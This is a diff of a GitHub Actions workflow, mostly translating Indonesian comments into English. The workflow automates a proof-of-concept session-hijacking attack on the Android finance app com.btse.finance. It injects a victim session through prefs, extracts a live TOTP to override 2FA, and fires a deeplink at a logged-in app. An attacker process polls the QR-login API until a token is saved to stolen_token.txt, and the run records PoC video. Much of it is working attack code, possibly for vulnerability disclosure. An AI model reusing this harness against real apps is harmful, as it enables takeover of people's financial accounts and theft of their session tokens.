@@ -5,8 +5,8 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 45
     env:
-      # UI login jalur app selalu gagal (server menolak login dari emulator) dan
-      # memakan ~10 menit/run. Sesi korban murni lewat injeksi prefs.
+      # UI login via the app path always fails (the server rejects logins from the
+      # emulator) and costs ~10 minutes each. The victim session comes purely from prefs injection.
       UI_LOGIN_ENABLED: '0'
     steps:
       - uses: actions/checkout@v4
@@ -123,7 +123,7 @@ jobs:
             adb shell pm grant com.btse.finance android.permission.$p 2>/dev/null || true
           done
           adb logcat -c || true
-          # Ekstrak TOTP live utk 2FA program override (fallback 123456)
+          # Extract a live TOTP for the 2FA program override (fallback 123456)
           adb shell am start -W -n com.btse.finance/com.example.project.ui.launch.LaunchActivity > /tmp/amstart.txt 2>&1 || true
           echo "AMSTART1:"; cat /tmp/amstart.txt
           sleep 25
@@ -164,13 +164,14 @@ jobs:
           adb wait-for-device; sleep 2
           ID=$(adb shell id | tr -d '\r'); echo "ADB_ID=$ID"
           D=/data/data/com.btse.finance
-          # Adopsi sesi flaky: app kadang menimpa base.xml dengan state guest saat
-          # cold start (race/network error). Retry push+relaunch, dan tunggu app
-          # benar-benar settle: focus MainActivity + token masih ada + OCR home
-          # login-aktif (guest home memuat tombol "Login"/"Sign-Up").
-          # Network warm-up: emulator kadang belum siap -> app gagal reach server,
-          # sesi lalu di-wipe saat cold start (gejala: "difficulties connecting to
-          # our servers" / "Connection Error"). Pastikan app bisa load home dulu.
+          # Flaky session adoption: the app sometimes overwrites base.xml with guest state
+          # on cold start (race/network error). Retry push+relaunch, and wait for the app
+          # to truly settle: MainActivity focus + token still present + home OCR showing
+          # an active login (a guest home contains a "Login"/"Sign-Up" button).
+          # Network warm-up: the emulator is sometimes not ready yet -> the app fails to
+          # reach the server, and the session then gets wiped on cold start (symptom:
+          # "difficulties connecting to our servers" / "Connection Error"). Make sure the
+          # app can load home first.
           NETOK=0
           for w in 1 2 3; do
             adb shell am force-stop com.btse.finance || true
@@ -282,7 +283,7 @@ jobs:
         run: |
           export PATH=$ANDROID_HOME/platform-tools:$PATH
           rm -f poc_sid.txt stolen_token.txt /tmp/ui.xml /tmp/attack.log
-          # 1) preflight DIRECT (bucket IP attacker/runner, tanpa proxy) — 400/401/200 = sehat
+          # 1) preflight DIRECT (attacker/runner bucket IP, no proxy) — 400/401/200 = healthy
           PF=000
           for i in $(seq 1 12); do
             U=$(python3 -c "import uuid;print(uuid.uuid4())")
@@ -292,13 +293,13 @@ jobs:
             sleep 15
           done
           case "$PF" in 400|401|200) echo PREFLIGHT_DIRECT_OK;; *) echo PREFLIGHT_DIRECT_FAIL;; esac
-          # 1b) preflight jalur app (SG proxy) — satu request saja, jangan spam
+          # 1b) preflight via the app path (SG proxy) — a single request only, do not spam
           U=$(python3 -c "import uuid;print(uuid.uuid4())")
           SGC=$(curl -4 -s -o /dev/null -w "%{http_code}" --max-time 15 -x http://43.156.21.122:8080 "https://testapi.btse.io/api/qr/info?sessionId=$U" || echo 000)
           echo "PREFLIGHT_SG=$SGC"
-          # 2b) RECOVERY: app kadang menimpa prefs dengan state guest saat cold start.
-          # Kalau token hilang dari base.xml, push ulang + relaunch (maks 2x) sebelum
-          # gate stabilitas, supaya jangan fire deeplink di app yang masih guest.
+          # 2b) RECOVERY: the app sometimes overwrites prefs with guest state on cold start.
+          # If the token is missing from base.xml, push again + relaunch (max 2x) before
+          # the stability gate, so we never fire the deeplink while the app is still a guest.
           D=/data/data/com.btse.finance
           if [ -s /tmp/base.xml ]; then
             for rec in 1 2; do
@@ -316,13 +317,13 @@ jobs:
             done
             echo "RECOVER_FINAL_KEPT=$(adb shell "cat $D/shared_prefs/base.xml 2>/dev/null" | grep -c 'LOGIN_TOKEN' || true)"
           fi
-          # 2) session check: UI login = source of truth; verifikasi DataStore tertulis
+          # 2) session check: UI login = source of truth; verify the DataStore was written
           if adb shell ls /data/data/com.btse.finance/files/datastore/ 2>/dev/null | grep -qiE "datastore|preferences"; then
             echo "DATASTORE_PRESENT"
           else
             echo "DATASTORE_ABSENT"
           fi
-          # 3) settle + STABILITY GATE: konfirmasi app benar-benar di HOME sebelum fire
+          # 3) settle + STABILITY GATE: confirm the app is really at HOME before firing
           sleep 40
           STABLE=0
           for g in $(seq 1 10); do
@@ -337,7 +338,7 @@ jobs:
                 STABLE=1; break
               fi
             fi
-            # belum stabil: retry node / relaunch ringan
+            # not stable yet: retry the node / light relaunch
             adb shell uiautomator dump /sdcard/ui2.xml >/dev/null 2>&1 || true
             adb pull /sdcard/ui2.xml /tmp/ui2.xml >/dev/null 2>&1 || true
             XY=$(python3 tools/uibounds.py /tmp/ui2.xml Retry 2>/dev/null || true)
@@ -345,21 +346,21 @@ jobs:
             sleep 15
           done
           echo "STABLE=$STABLE"
-          # 3b) quiet period: beri 60s ekstra agar burst refresh background habis
+          # 3b) quiet period: allow an extra 60s so the background refresh burst finishes
           sleep 60
-          # 4) attack loop: max 2 ronde; FIRE-ONCE deeplink + TTL guard (sid ±180s)
-          #    egress app: DIRECT runner (SG egress ter-throttle testapi)
-          #    attacker poll: direct (IP runner) — semua satu egress bersih
+          # 4) attack loop: max 2 rounds; FIRE-ONCE deeplink + TTL guard (sid ±180s)
+          #    app egress: DIRECT runner (SG egress, testapi throttled)
+          #    attacker poll: direct (runner IP) — all on one clean egress
           for round in 1 2; do
             if [ -s stolen_token.txt ]; then break; fi
             if [ "$round" -eq 2 ] && [ "$STABLE" != "1" ]; then
               echo "SKIP_ROUND2_NO_SESSION STABLE=$STABLE (app never reached HOME)"
               break
             fi
-            # rekam layar utk video PoC (max 170s < limit screenrecord 180s)
+            # record the screen for the PoC video (max 170s < screenrecord limit 180s)
             ( adb shell screenrecord --time-limit 170 /sdcard/poc_r${round}.mp4 > /dev/null 2>&1 & )
             echo "SCREEN_RECORD r${round} started"
-            # in-loop gate PASSIVE: tunggu focus kembali (max 30s), jangan relaunch = jangan burst
+            # in-loop gate PASSIVE: wait for focus to come back (max 30s), no relaunch = no burst
             for w in $(seq 1 6); do
               FOCUS=$(adb shell dumpsys window 2>/dev/null | grep -m1 mCurrentFocus | tr -d '\r')
               echo "INLOOP_FOCUS[$round.$w]=$FOCUS"
@@ -388,7 +389,7 @@ jobs:
             T0=$(date +%s)
             for i in $(seq 1 22); do
               [ -s stolen_token.txt ] && break
-              # TTL guard: sisa sid < 25 detik -> stop (sid expired = re-fire sia-sia)
+              # TTL guard: sid remaining < 25s -> stop (sid expired = re-firing is pointless)
               AGE=$(( $(date +%s) - T0 ))
               [ "$AGE" -ge 155 ] && { echo "TTL_GUARD stop i=$i age=$AGE"; break; }
               sleep 6
@@ -430,11 +431,11 @@ jobs:
                 fi
               fi
             done
-            # tunggu token attacker (post-tap ada jeda: approve→poll SUCCESS)
+            # wait for the attacker token (there is a delay after the tap: approve→poll SUCCESS)
             for i in $(seq 1 15); do [ -s stolen_token.txt ] && break; sleep 2; done
             kill $ATK 2>/dev/null || true
-            # stop screenrecord: SIGINT supaya MediaMuxer menulis moov (index).
-            # SIGTERM/pkill bikin moov tidak pernah ditulis -> mp4 tidak playable.
+            # stop screenrecord: SIGINT so MediaMuxer writes the moov (index).
+            # SIGTERM/pkill makes the moov never get written -> mp4 not playable.
             adb shell 'kill -2 $(pidof screenrecord)' 2>/dev/null || true
             for w in $(seq 1 20); do
               adb shell pidof screenrecord >/dev/null 2>&1 || break
@@ -452,7 +453,7 @@ jobs:
             done
             echo "VIDEO_R${round}=$(stat -c %s /tmp/poc_r${round}.mp4 2>/dev/null || echo missing) FINALIZED=$VIDOK"
             if [ -s stolen_token.txt ]; then break; fi
-            echo "ROUND=$round NO_TOKEN TAPPED=$TAPPED ERRC=$ERRC lanjut ronde berikutnya"
+            echo "ROUND=$round NO_TOKEN TAPPED=$TAPPED ERRC=$ERRC moving to next round"
           done
           adb shell screencap -p /sdcard/s5.png || true
           adb pull /sdcard/s5.png /tmp/s5.png >/dev/null 2>&1 || true
